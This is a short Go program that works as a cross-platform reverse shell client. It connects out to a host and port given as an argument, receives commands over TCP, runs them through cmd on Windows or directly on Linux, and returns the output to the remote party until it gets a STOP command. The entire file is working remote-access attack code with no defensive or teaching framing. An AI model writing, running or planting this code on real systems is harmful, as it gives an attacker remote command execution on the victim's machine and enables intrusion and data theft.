package main

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"os/exec"
	"runtime"
	"strings"
)

func OSCheck() string {
	var OSShell string
	if runtime.GOOS == "windows" {
		fmt.Println("OS identified as Windows")
		//command =
		OSShell = "windows"
		// err := ni

	} else if runtime.GOOS == "linux" {
		fmt.Println("OS identified as: Linux")
		OSShell = "linux"

	}
	return OSShell

}

func main() {
	arguments := os.Args
	if len(arguments) == 1 {
		fmt.Println("Please provide host:port.")
		return
	}

	CONNECT := arguments[1]
	c, err := net.Dial("tcp", CONNECT)
	if err != nil {
		fmt.Println(err)
		return
	}

	for {
		// reader := bufio.NewReader(os.Stdin)
		// fmt.Print(">> ")
		// text, _ := reader.ReadString('\n')
		// fmt.Fprintf(c, text+"\n")
		var results string
		commandString, _ := bufio.NewReader(c).ReadString('\n')
		fmt.Print("->: " + commandString)
		if strings.TrimSpace(string(commandString)) == "STOP" {
			fmt.Println("TCP client exiting...")
			return
		}

		checkOS := OSCheck()
		if checkOS == "windows" {
			fmt.Println("WINDOWS")
			CommandExec, err := exec.Command("cmd", "/C", commandString).Output()
			if err != nil {
				fmt.Println("Error executing command", err)
			}
			CommandExec2 := string(CommandExec)
			results = strings.TrimSpace(CommandExec2)
			// fmt.Println(reflect.TypeOf(CommandExec))
			// fmt.Println(reflect.TypeOf(err))

		} else if checkOS == "linux" {
			fmt.Println("LINUX")
			//fmt.Println("XS", command)
			CommandExec, err := exec.Command(strings.TrimSpace(commandString)).Output()
			if err != nil {
				fmt.Println("Error executing command", err)
			}
			CommandExec2 := string(CommandExec) // need for commands on linux - remove \r\n
			results = strings.TrimSpace(CommandExec2)
		}
		fmt.Println(results)
		//writing
		//fmt.Fprintf(c, results+"\n")
		c.Write([]byte(results))
	}
}
